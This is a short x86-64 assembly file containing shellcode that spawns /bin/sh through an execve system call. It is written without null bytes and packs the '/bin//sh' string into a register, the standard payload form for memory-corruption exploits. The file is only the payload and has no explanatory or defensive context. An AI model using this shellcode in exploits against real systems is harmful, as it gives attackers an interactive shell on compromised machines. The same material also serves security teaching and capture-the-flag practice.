bits 64
section .text
global _start

_start:

	; execve("/bin/sh", NULL, NULL)

	xor rsi, rsi
	push rsi
	pop rdx

	push rsi
	mov rdi, 0x68732f2f6e69622f ; /bin//sh
	push rdi
	mov rdi, rsp

	push 0x3b
	pop rax ; SYS_execve
	syscall